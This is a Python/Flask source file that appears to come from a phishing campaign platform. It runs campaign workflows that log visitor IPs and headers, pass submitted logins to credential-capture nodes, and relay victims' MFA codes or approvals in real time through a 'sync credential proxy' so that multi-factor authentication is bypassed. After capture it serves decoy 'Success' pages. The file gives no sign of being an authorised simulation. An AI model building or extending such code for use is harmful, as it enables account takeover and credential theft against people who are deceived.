"""
Workflow executor for campaigns
Handles GET/POST request processing through workflows
"""
from typing import Dict, Any, Optional
from flask import Response, request, session, current_app, redirect, jsonify, make_response, g
from shared.database import db, Campaign, Workflow, WorkflowNode, Event
from shared.workflow_variables import resolve_variables, interpolate_dict
from workflows.engine import WorkflowEngine
from plugins import get_plugin
import logging

logger = logging.getLogger(__name__)

class WorkflowExecutor:
    """Execute workflows for campaign requests"""
    
    def __init__(self):
        self.engine = WorkflowEngine()
    
    def execute_get(self, campaign: Campaign) -> Response:
        """
        Execute GET workflow for a campaign

        Args:
            campaign: Campaign instance

        Returns:
            Flask Response
        """
        if not campaign.get_workflow_id:
            logger.error(f"Campaign {campaign.uid} has no GET workflow assigned")
            return self._error_response("No GET workflow configured", 500)
        
        workflow = Workflow.query.get(campaign.get_workflow_id)
        if not workflow:
            logger.error(f"GET workflow {campaign.get_workflow_id} not found for campaign {campaign.uid}")
            return self._error_response("Workflow not found", 404)
        
        # Validate workflow supports GET
        if workflow.http_method not in ('GET', 'BOTH'):
            logger.error(f"Workflow {workflow.id} does not support GET requests")
            return self._error_response("Workflow does not support GET requests", 400)
        
        # Build execution context
        context = self._build_context(campaign, 'GET')
        
        # Execute workflow
        try:
            result_context = self.engine.execute_workflow(
                workflow_id=workflow.id,
                context=context,
                campaign_id=campaign.id,
                hook_name='campaign_get'
            )
            self._persist_set_session(result_context)

            # Create page_view event for statistics
            try:
                # Get session ID if available
                session_id = context.get('session', {}).get('session_id') or context.get('session', {}).get('id') or None
                
                page_view_event = Event(
                    campaign_id=campaign.id,
                    event_type='page_view',
                    data={
                        'path': request.path,
                        'query_params': dict(request.args),
                        'referer': request.headers.get('Referer'),
                        'method': 'GET'
                    },
                    ip_address=request.remote_addr,
                    user_agent=request.headers.get('User-Agent', ''),
                    session_id=session_id
                )
                db.session.add(page_view_event)
                db.session.commit()
                logger.debug(f"Page view event created for campaign {campaign.uid}")
            except Exception as e:
                # Don't fail the request if event logging fails
                logger.warning(f"Failed to create page_view event: {e}")
                db.session.rollback()
            
            # Convert result to response
            return self._context_to_response(result_context)
            
        except Exception as e:
            logger.exception(f"Error executing GET workflow for campaign {campaign.uid}: {e}")
            return self._error_response("Workflow execution failed", 500)
    
    def execute_post(self, campaign: Campaign) -> Response:
        """
        Execute POST workflow for a campaign
        
        Args:
            campaign: Campaign instance
            
        Returns:
            Flask Response
        """
        if not campaign.post_workflow_id:
            logger.error(f"Campaign {campaign.uid} has no POST workflow assigned")
            return self._error_response("No POST workflow configured", 500)
        
        workflow = Workflow.query.get(campaign.post_workflow_id)
        if not workflow:
            logger.error(f"POST workflow {campaign.post_workflow_id} not found for campaign {campaign.uid}")
            return self._error_response("Workflow not found", 404)
        
        # Validate workflow supports POST
        if workflow.http_method not in ('POST', 'BOTH'):
            logger.error(f"Workflow {workflow.id} does not support POST requests")
            return self._error_response("Workflow does not support POST requests", 400)
        
        # Build execution context
        context = self._build_context(campaign, 'POST')

        # --- Sync proxy continuation shortcut ---
        # If a sync proxy session is active, this POST carries an MFA code or
        # approval — NOT fresh credentials.  Running the full workflow would
        # hit email-validation / capture-credentials nodes that rightfully
        # reject the MFA form data.  Bypass the workflow and invoke the sync
        # proxy plugin directly.
        sync_session_id = session.get('_sync_proxy_session_id')
        if sync_session_id:
            try:
                result_context = self._execute_sync_proxy_continuation(
                    workflow, context, campaign
                )
                if result_context is not None:
                    self._persist_set_session(result_context)
                    # If the plugin set _stop_workflow (needs_input / needs_display / failed),
                    # return immediately — the HTML response is already in the context.
                    if result_context.get('_stop_workflow'):
                        return self._context_to_response(result_context)
                    # Success path: the workflow should continue from the proxy node
                    # onwards (e.g. Render Template, Redirect).  Resume execution
                    # from the proxy node's connections via the engine.
                    return self._resume_workflow_after_node(
                        workflow, result_context, campaign, 'sync_credential_proxy'
                    )
                # If None, fall through to normal workflow execution
                # (e.g. sync proxy node not found in workflow)
            except Exception as e:
                logger.exception(f"Sync proxy continuation failed: {e}")
                # Fall through to normal workflow execution

        # Execute workflow
        try:
            result_context = self.engine.execute_workflow(
                workflow_id=workflow.id,
                context=context,
                campaign_id=campaign.id,
                hook_name='campaign_post'
            )
            self._persist_set_session(result_context)

            # Convert result to response
            return self._context_to_response(result_context)

        except Exception as e:
            logger.exception(f"Error executing POST workflow for campaign {campaign.uid}: {e}")
            return self._error_response("Workflow execution failed", 500)
    
    def _build_context(self, campaign: Campaign, method: str) -> Dict[str, Any]:
        """
        Build execution context for workflow
        
        Args:
            campaign: Campaign instance
            method: HTTP method ('GET' or 'POST')
            
        Returns:
            Context dictionary
        """
        context = {
            'campaign': {
                'id': campaign.id,
                'uid': campaign.uid,
                'name': campaign.name,
                'template_html': campaign.template_html or '',  # Can be None for outbound campaigns
                'template_id': campaign.template_id,
                'config': campaign.config
            },
            'request': {
                'method': method,
                'path': request.path,
                'query_params': dict(request.args),
                'form_data': dict(request.form) if method == 'POST' else {},
                'ip_address': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', ''),
                'referer': request.headers.get('Referer', ''),
                'headers': dict(request.headers)
            },
            'session': dict(session),
            'variables': campaign.variables or {}
        }
        
        # Resolve variables into context
        context = resolve_variables(context, campaign.variables or {})

        return context

    def _execute_sync_proxy_continuation(
        self, workflow: Workflow, context: Dict[str, Any], campaign: Campaign
    ) -> Optional[Dict[str, Any]]:
        """
        Bypass the full workflow and execute ONLY the sync credential proxy
        plugin for MFA continuation POSTs.

        On continuation POSTs the form data contains an MFA code or approval
        token — not credentials.  Running the full workflow would trigger
        email-validation and capture-credentials nodes that reject the form.

        Returns the modified context, or None if no sync proxy node was found
        or the session is stale (caller should fall through to normal workflow).
        """
        sync_session_id = session.get('_sync_proxy_session_id')

        # Verify the proxy session is still alive before bypassing the workflow.
        # If it expired (e.g. server restart), clear the stale cookie and let
        # the full workflow run so Capture Credentials can do its thing.
        from workflows.sync_proxy_manager import get_sync_proxy_manager
        manager = get_sync_proxy_manager()
        if not manager or not manager.get_session(sync_session_id):
            logger.warning(
                f"Sync proxy session {sync_session_id} not found, "
                "clearing stale session — full workflow will run"
            )
            session.pop('_sync_proxy_session_id', None)
            session.modified = True
            return None

        # Find the sync_credential_proxy node in this workflow
        proxy_node = WorkflowNode.query.filter_by(
            workflow_id=workflow.id,
            plugin_type='sync_credential_proxy',
        ).first()

        if not proxy_node:
            logger.debug("No sync_credential_proxy node in workflow, skipping continuation shortcut")
            return None

        plugin = get_plugin('sync_credential_proxy')
        if not plugin:
            logger.error("sync_credential_proxy plugin not registered")
            return None

        config = proxy_node.config or {}
        logger.info(
            f"Sync proxy continuation shortcut for campaign {campaign.uid} "
            f"(session={sync_session_id})"
        )

        result_context = plugin.execute(context.copy(), config)
        if result_context is None or not isinstance(result_context, dict):
            return context
        return result_context

    def _resume_workflow_after_node(
        self, workflow: Workflow, context: Dict[str, Any],
        campaign: Campaign, plugin_type: str
    ) -> Response:
        """
        Resume workflow execution from the connections of a specific plugin node.
        Used after the sync proxy continuation shortcut succeeds — the plugin
        ran in isolation, now we need to execute the downstream nodes
        (e.g. Render Template, Redirect) that follow it in the workflow.
        """
        try:
            nodes = WorkflowNode.query.filter_by(workflow_id=workflow.id).order_by(WorkflowNode.id).all()
            node_map = {node.node_id: node for node in nodes}

            # Find the plugin node we're resuming from
            proxy_node = None
            for n in nodes:
                if n.plugin_type == plugin_type:
                    proxy_node = n
                    break

            if not proxy_node:
                logger.warning(f"Could not find {plugin_type} node to resume from")
                return self._context_to_response(context)

            # Resolve boolean path branching for this node's connections
            # (e.g. sync_proxy_success=True → follow "true" path to Render Template)
            connections = proxy_node.connections or []
            executed_nodes = {proxy_node.node_id}  # don't re-run the proxy

            plugin = get_plugin(plugin_type)
            branch_key = plugin.get_branch_context_key() if plugin else None

            if branch_key and connections:
                # Resolve the branch value from context
                value = context
                for part in branch_key.split('.'):
                    if isinstance(value, dict):
                        value = value.get(part)
                    else:
                        value = None
                        break
                resolved_path = "true" if value else "false"

                for conn in connections:
                    if isinstance(conn, dict):
                        conn_path = conn.get('path', '')
                        if conn_path == 'success':
                            conn_path = 'true'
                        elif conn_path == 'fail':
                            conn_path = 'false'
                        if conn_path == resolved_path:
                            target_id = conn.get('target')
                            if target_id and target_id in node_map:
                                context = self.engine._execute_node(
                                    node_map[target_id], node_map,
                                    context, executed_nodes
                                )
            else:
                # No branching — follow all connections
                for conn in connections:
                    target_id = conn.get('target') if isinstance(conn, dict) else conn
                    if target_id and target_id in node_map:
                        context = self.engine._execute_node(
                            node_map[target_id], node_map,
                            context, executed_nodes
                        )

            self._persist_set_session(context)
            return self._context_to_response(context)

        except Exception as e:
            logger.exception(f"Error resuming workflow after {plugin_type}: {e}")
            return self._context_to_response(context)

    def _persist_set_session(self, result_context: Dict[str, Any]) -> None:
        """
        Persist workflow _set_session updates to Flask session.
        Plugins may set context['_set_session'] to a dict of key-value pairs
        to be written to the session. Removes _set_session from context after
        persisting to avoid leaking into execution logs.
        """
        set_session = result_context.pop('_set_session', None)
        if not set_session or not isinstance(set_session, dict):
            return
        for k, v in set_session.items():
            session[k] = v
        logger.debug("Persisted _set_session to Flask session: %s", list(set_session.keys()))

    def _context_to_response(self, context: Dict[str, Any]) -> Response:
        """
        Convert workflow execution context to Flask Response
        
        Looks for response data in context:
        - _response_html: HTML content
        - _response_redirect: Redirect URL
        - _response_json: JSON data
        - _response_status: HTTP status code
        - _response_headers: Custom headers
        
        Args:
            context: Workflow execution context
            
        Returns:
            Flask Response
        """
        # If a plugin rendered its own page (e.g. MFA prompt), honour that
        # over any redirect that a downstream node may have set.
        logger.info(
            f"_context_to_response: _stop_workflow={context.get('_stop_workflow')}, "
            f"has_html={'_response_html' in context}, "
            f"has_redirect={'_response_redirect' in context}"
        )
        if context.get('_stop_workflow') and '_response_html' in context:
            status_code = context.get('_response_status', 200)
            headers = context.get('_response_headers', {})
            response = make_response(context['_response_html'], status_code)
            for key, value in headers.items():
                response.headers[key] = value
            if context.get('_template_id'):
                response.headers['X-Template-Id'] = str(context['_template_id'])
            return response

        # Check for redirect
        if '_response_redirect' in context:
            redirect_url = context['_response_redirect']
            # Debug logging only in development mode
            if current_app.config.get('DEBUG', False):
                logger.debug(f"Processing redirect: {redirect_url}")
            # Handle relative URLs
            if redirect_url.startswith('/'):
                # Relative URL - if it's just '/', redirect back to campaign page
                if redirect_url == '/':
                    campaign_uid = context.get('campaign', {}).get('uid')
                    if campaign_uid:
                        redirect_url = f'/{campaign_uid}'
                    else:
                        # Fallback: use default success page instead of redirecting
                        logger.warning("Redirect URL is '/' but no campaign UID available, using default success page")
                        if 'captured_credentials' in context:
                            default_success_html = """
                            <!DOCTYPE html>
                            <html>
                            <head>
                                <title>Success</title>
                                <style>
                                    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
                                    .success { color: #27ae60; }
                                </style>
                            </head>
                            <body>
                                <h1 class="success">Success</h1>
                                <p>Your information has been submitted successfully.</p>
                            </body>
                            </html>
                            """
                            return make_response(default_success_html, 200)
                        return self._error_response("Invalid redirect configuration", 500)
                else:
                    # Relative URL like '/path' - make it relative to current request
                    # Check if we have domain from Caddy header or g (e.g. Host-based identification)
                    campaign_domain = request.headers.get('X-Campaign-Domain') or getattr(g, 'campaign_domain', None)
                    
                    if campaign_domain:
                        # Use domain-based URL (Caddy will route correctly)
                        scheme = 'https' if request.is_secure else 'http'
                        redirect_url = f'{scheme}://{campaign_domain}{redirect_url}'
                    else:
                        # Fallback to UID-based URL
                        campaign_uid = context.get('campaign', {}).get('uid')
                        if campaign_uid and not redirect_url.startswith(f'/{campaign_uid}'):
                            # Prepend campaign UID if not already present
                            redirect_url = f'/{campaign_uid}{redirect_url}'
            elif not redirect_url.startswith(('http://', 'https://')):
                # Not a relative URL and not absolute - treat as domain and prepend http://
                redirect_url = 'http://' + redirect_url
            status_code = context.get('_response_status', 302)
            # Debug logging only in development mode
            if current_app.config.get('DEBUG', False):
                logger.debug(f"Final redirect URL: {redirect_url} (status: {status_code})")
            return redirect(redirect_url, code=status_code)
        
        # Check for JSON response
        if '_response_json' in context:
            status_code = context.get('_response_status', 200)
            response = jsonify(context['_response_json'])
            response.status_code = status_code
            return response
        
        # Check for HTML response
        if '_response_html' in context:
            status_code = context.get('_response_status', 200)
            headers = context.get('_response_headers', {})
            response = make_response(context['_response_html'], status_code)
            for key, value in headers.items():
                response.headers[key] = value
            # So /assets/ can serve from the template that was rendered (e.g. workflow "Template from library")
            if context.get('_rendered_template_id') is not None:
                from flask import session
                session['_rendered_template_id'] = context['_rendered_template_id']
                session.modified = True
            return response
        
        # Default: return HTML from context if available
        if 'html' in context:
            return make_response(context['html'], context.get('_response_status', 200))
        
        # Check if credentials were captured - provide default success page
        if 'captured_credentials' in context:
            logger.info("Credentials captured but no response configured, using default success page")
            default_success_html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Success</title>
                <meta http-equiv="refresh" content="3;url=/">
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
                    .success { color: #27ae60; }
                </style>
            </head>
            <body>
                <h1 class="success">Success</h1>
                <p>Your information has been submitted successfully.</p>
                <p>Redirecting...</p>
            </body>
            </html>
            """
            return make_response(default_success_html, 200)
        
        # Fallback error response with debug info
        logger.warning(
            f"Workflow did not return a valid response. Context keys: {list(context.keys())}. "
            f"Workflow execution ID: {context.get('_workflow_execution_id')}"
        )
        return self._error_response("No response generated", 500)
    
    def _error_response(self, message: str, status_code: int = 500) -> Response:
        """Generate error response"""
        error_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <style>
                body {{ font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }}
                .error {{ color: #e74c3c; }}
            </style>
        </head>
        <body>
            <h1 class="error">Error</h1>
            <p>{message}</p>
        </body>
        </html>
        """
        return make_response(error_html, status_code)

